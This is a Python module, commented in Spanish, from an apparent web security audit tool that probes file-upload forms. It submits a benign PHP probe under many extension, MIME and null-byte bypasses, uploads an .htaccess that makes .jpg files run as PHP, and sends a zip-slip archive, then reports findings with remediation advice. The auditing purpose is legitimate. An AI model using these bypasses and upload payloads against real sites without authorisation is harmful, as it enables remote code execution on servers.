"""
Módulo de auditoría de subida de archivos — AuditPyme
Detecta: subida de shells PHP, bypass de extensión/MIME, ejecución de archivos,
zip slip y .htaccess upload para RCE completo.
"""

import requests
import urllib3
import re
import os
import io
import zipfile
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
TIMEOUT = 12
UA = "Mozilla/5.0 (compatible; AuditPyme/1.0)"

# Payload PHP inocuo: solo devuelve un hash conocido, no modifica nada
PHP_PROBE_TOKEN = "auditpyme_rce_probe_2025"
PHP_PROBE_BODY  = f'<?php echo md5("{PHP_PROBE_TOKEN}"); ?>'
PHP_PROBE_HASH  = "c2a2282aaca8c9ecd57f174fdeae15e6"  # md5("auditpyme_rce_probe_2025")

# Bypasses de extensión a probar (de más a menos obvio)
EXTENSION_BYPASSES = [
    ("php_directo",      "shell.php",      "application/octet-stream"),
    ("php5",             "shell.php5",     "application/octet-stream"),
    ("phtml",            "shell.phtml",    "application/octet-stream"),
    ("phar",             "shell.phar",     "application/octet-stream"),
    ("shtml",            "shell.shtml",    "application/octet-stream"),
    ("php_mayuscula",    "shell.PHP",      "application/octet-stream"),
    ("php_mixto",        "shell.PhP",      "application/octet-stream"),
    ("doble_ext_jpg",    "shell.php.jpg",  "image/jpeg"),
    ("doble_ext_png",    "shell.php.png",  "image/png"),
    ("mime_jpeg",        "shell.php",      "image/jpeg"),          # MIME bypass
    ("mime_gif",         "shell.php",      "image/gif"),
    ("null_byte",        "shell.php\x00.jpg", "image/jpeg"),       # null byte
    ("htaccess",         ".htaccess",      "text/plain"),          # configura ejecución
]

# Contenido del .htaccess malicioso: ejecutar .jpg como PHP
HTACCESS_CONTENT = b"AddType application/x-httpd-php .jpg\nAddHandler php-script .jpg\n"

# Rutas comunes donde suelen acabar los uploads
UPLOAD_PATHS = [
    "/uploads/", "/upload/", "/files/", "/file/", "/media/",
    "/images/", "/img/", "/assets/", "/docs/", "/documents/",
    "/tmp/", "/temp/", "/storage/", "/public/", "/static/",
    "/wp-content/uploads/",  # WordPress
    "/sites/default/files/", # Drupal
    "/modules/",             # PrestaShop
]


class FileUploadAuditor:
    def __init__(self, target: str, recon_data: dict = None, stealth: bool = False):
        self.target = target
        self.recon_data = recon_data or {}
        self.findings = []
        self.stealth = stealth
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self.session.verify = False
        self._base_urls = self._build_base_urls()

    def scan(self) -> list:
        print(f"\n  [*] Buscando formularios de subida de archivos en: {self.target}")
        upload_forms = []
        for base_url in self._base_urls:
            forms = self._find_upload_forms(base_url)
            upload_forms.extend(forms)

        if not upload_forms:
            print("  [-] No se encontraron formularios de subida de archivos")
            return self.findings

        print(f"  [+] {len(upload_forms)} formulario(s) con subida encontrado(s)")
        for form in upload_forms:
            self._audit_upload_form(form)

        return self.findings

    # ── Descubrimiento de formularios ─────────────────────────────────────────

    def _find_upload_forms(self, base_url: str) -> list:
        """Rastrea páginas en busca de formularios con <input type='file'>."""
        forms = []
        pages_to_check = [base_url]

        # Añadir rutas comunes con formularios de subida
        for path in ["/contact", "/contacto", "/upload", "/subir",
                     "/cv", "/candidatura", "/soporte", "/support",
                     "/ticket", "/adjunto", "/profile", "/perfil",
                     "/account", "/cuenta", "/admin/upload"]:
            pages_to_check.append(base_url.rstrip("/") + path)

        visited = set()
        for url in pages_to_check[:15]:
            if url in visited:
                continue
            visited.add(url)
            try:
                resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
                if resp.status_code != 200:
                    continue
                page_forms = self._parse_upload_forms(resp.text, resp.url)
                for f in page_forms:
                    if f not in forms:
                        forms.append(f)
                        print(f"  [FORM] Subida en: {f['action']} (campo: {f['file_field']})")
            except Exception:
                continue
        return forms

    def _parse_upload_forms(self, html: str, page_url: str) -> list:
        """Extrae formularios con input type=file."""
        forms = []
        form_blocks = re.findall(
            r'<form[^>]*>(.*?)</form>', html, re.IGNORECASE | re.DOTALL
        )
        for i, form_html in enumerate(form_blocks):
            # Buscar si tiene input type="file"
            file_inputs = re.findall(
                r'<input[^>]+type=["\']file["\'][^>]*>', form_html, re.IGNORECASE
            )
            if not file_inputs:
                continue

            # Extraer action del form
            form_tag = re.search(
                r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>',
                html[html.find(form_html)-200:html.find(form_html)+100],
                re.IGNORECASE
            )
            action = urljoin(page_url, form_tag.group(1)) if form_tag else page_url

            # Nombre del campo de archivo
            file_field_m = re.search(
                r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']',
                file_inputs[0], re.IGNORECASE
            )
            if not file_field_m:
                file_field_m = re.search(
                    r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']file["\']',
                    file_inputs[0], re.IGNORECASE
                )
            file_field = file_field_m.group(1) if file_field_m else "file"

            # Campos hidden (tokens CSRF, etc.)
            hidden = {}
            for tag in re.findall(r'<input[^>]+type=["\']hidden["\'][^>]*>', form_html, re.IGNORECASE):
                n = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                v = re.search(r'value=["\']([^"\']*)["\']', tag, re.IGNORECASE)
                if n:
                    hidden[n.group(1)] = v.group(1) if v else ""

            forms.append({
                "action":     action,
                "file_field": file_field,
                "hidden":     hidden,
                "page_url":   page_url,
            })
        return forms

    # ── Auditoría de formulario ───────────────────────────────────────────────

    def _audit_upload_form(self, form: dict):
        action     = form["action"]
        file_field = form["file_field"]
        hidden     = form["hidden"]

        print(f"  [*] Auditando formulario en {action}...")

        for bypass_name, filename, mime_type in EXTENSION_BYPASSES:
            # Contenido especial para .htaccess
            if filename == ".htaccess":
                content = HTACCESS_CONTENT
            else:
                content = PHP_PROBE_BODY.encode()

            try:
                files = {file_field: (filename, io.BytesIO(content), mime_type)}
                data  = dict(hidden)
                resp  = self.session.post(action, files=files, data=data,
                                          timeout=TIMEOUT, allow_redirects=True)

                # Extraer URL del archivo subido de la respuesta
                upload_url = self._extract_upload_url(resp, action, filename)

                if upload_url:
                    executed = self._check_execution(upload_url, filename)
                    if executed:
                        self._add(
                            "CRITICAL",
                            f"RCE via subida de archivo — bypass '{bypass_name}'",
                            f"Archivo PHP ejecutado tras subida con bypass '{bypass_name}'. "
                            f"Filename: '{filename}', MIME: '{mime_type}'. "
                            f"URL de ejecución: {upload_url}",
                            "Un atacante puede subir una web shell PHP y ejecutar comandos "
                            "arbitrarios en el servidor: leer la base de datos completa, "
                            "crear usuarios administrador, robar todos los archivos del servidor.",
                            "Validar la extensión del archivo en el servidor (whitelist: jpg, png, pdf, docx). "
                            "Almacenar fuera del webroot o en bucket S3 con ejecución deshabilitada. "
                            "Renombrar el archivo al subir (UUID aleatorio sin extensión ejecutable). "
                            "Comprobar el contenido real del archivo (magic bytes), no solo el MIME."
                        )
                        print(f"  [CRITICAL] RCE confirmado via {bypass_name}: {upload_url}")
                        return  # Un RCE es suficiente — no seguir probando
                    elif resp.status_code in (200, 201, 302):
                        # Subida aceptada pero no ejecutada (o no encontramos la URL)
                        self._add(
                            "HIGH",
                            f"Subida de archivo sin validación — {bypass_name}",
                            f"El servidor aceptó la subida de '{filename}' (HTTP {resp.status_code}) "
                            f"con MIME '{mime_type}' en {action}. "
                            "No se pudo confirmar ejecución (archivo no localizado).",
                            "Archivo potencialmente ejecutable aceptado por el servidor. "
                            "Si el directorio de subidas tiene ejecución PHP activa, "
                            "es posible RCE. Requiere verificación manual.",
                            "Validar extensiones en servidor y deshabilitar ejecución PHP "
                            "en directorios de uploads."
                        )
                        print(f"  [HIGH] Subida aceptada sin ejecutar (bypass {bypass_name})")

            except Exception:
                continue

        # Test zip slip
        self._check_zip_slip(action, file_field, hidden)

    def _extract_upload_url(self, resp, action: str, filename: str) -> str | None:
        """Intenta extraer la URL del archivo subido de la respuesta."""
        body = resp.text

        # 1. JSON con URL en la respuesta
        for pattern in [
            r'"url"\s*:\s*"([^"]+)"',
            r'"path"\s*:\s*"([^"]+)"',
            r'"file"\s*:\s*"([^"]+)"',
            r'"location"\s*:\s*"([^"]+)"',
            r'"src"\s*:\s*"([^"]+)"',
        ]:
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                return urljoin(action, m.group(1))

        # 2. Header Location
        if resp.history:
            return resp.url

        # 3. Buscar en el HTML un link al archivo subido
        name_base = filename.replace(".php", "").replace(".PHP", "")
        m = re.search(rf'href=["\']([^"\']*{re.escape(name_base)}[^"\']*)["\']', body, re.IGNORECASE)
        if m:
            return urljoin(action, m.group(1))

        # 4. Probar rutas de upload comunes
        base = action.rsplit("/", 1)[0]
        for upload_path in UPLOAD_PATHS:
            candidate = f"{urlparse(action).scheme}://{urlparse(action).netloc}{upload_path}{filename}"
            try:
                r = self.session.get(candidate, timeout=6)
                if r.status_code == 200 and len(r.content) > 0:
                    return candidate
            except Exception:
                pass
        return None

    def _check_execution(self, url: str, filename: str) -> bool:
        """Comprueba si el archivo PHP fue ejecutado (busca el hash del probe)."""
        if not any(url.endswith(ext) for ext in
                   (".php", ".php5", ".phtml", ".phar", ".shtml", ".PHP", ".PhP")):
            return False
        try:
            r = self.session.get(url, timeout=TIMEOUT)
            # Si devuelve el hash esperado, PHP se ejecutó
            if PHP_PROBE_HASH in r.text:
                return True
            # Si devuelve código PHP sin ejecutar → servidor no ejecuta PHP aquí (bueno)
            if "<?php" in r.text:
                return False
        except Exception:
            pass
        return False

    def _check_zip_slip(self, action: str, file_field: str, hidden: dict):
        """Crea un ZIP con path traversal en el nombre de archivo y lo sube."""
        try:
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, "w") as zf:
                # Path traversal: extraería el archivo fuera del directorio de uploads
                zf.writestr("../../../../tmp/auditpyme_zipslip_probe.txt",
                             "auditpyme_zipslip_test")
            zip_buffer.seek(0)

            files = {file_field: ("archive.zip", zip_buffer, "application/zip")}
            data  = dict(hidden)
            resp  = self.session.post(action, files=files, data=data,
                                      timeout=TIMEOUT, allow_redirects=True)

            if resp.status_code in (200, 201):
                # Verificar si el archivo apareció fuera del directorio esperado
                # (difícil de comprobar sin más contexto, reportamos como sospechoso)
                body = resp.text.lower()
                if "extracted" in body or "unzip" in body or "zip" in body:
                    self._add(
                        "HIGH",
                        f"Posible Zip Slip en {action}",
                        f"El servidor acepta archivos ZIP y parece procesarlos. "
                        "Se detectó aceptación de ZIP con path traversal en nombre de archivo.",
                        "Zip Slip permite extraer archivos fuera del directorio de destino, "
                        "pudiendo sobrescribir archivos del sistema o crear web shells.",
                        "Al descomprimir ZIPs, validar que las rutas no contengan '../' o rutas absolutas. "
                        "Usar bibliotecas seguras (Python: zipfile con verificación de path)."
                    )
                    print(f"  [HIGH] Posible Zip Slip en {action}")
        except Exception:
            pass

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _build_base_urls(self) -> list:
        urls = []
        for host in self.recon_data.get("hosts", []):
            if host["estado"] != "up":
                continue
            for p in host["puertos"]:
                port = p["puerto"]
                svc = p["servicio"].lower()
                if "http" in svc or port in (80, 443, 8080, 8443):
                    proto = "https" if port in (443, 8443) else "http"
                    url = (f"{proto}://{self.target}:{port}"
                           if port not in (80, 443) else f"{proto}://{self.target}")
                    if url not in urls:
                        urls.append(url)
        return urls or [f"https://{self.target}"]

    def _add(self, severidad, nombre, descripcion, impacto, recomendacion):
        for f in self.findings:
            if f["nombre"] == nombre:
                return
        self.findings.append({
            "severidad":     severidad,
            "tipo":          "FILE UPLOAD",
            "nombre":        nombre,
            "descripcion":   descripcion,
            "impacto":       impacto,
            "recomendacion": recomendacion,
        })
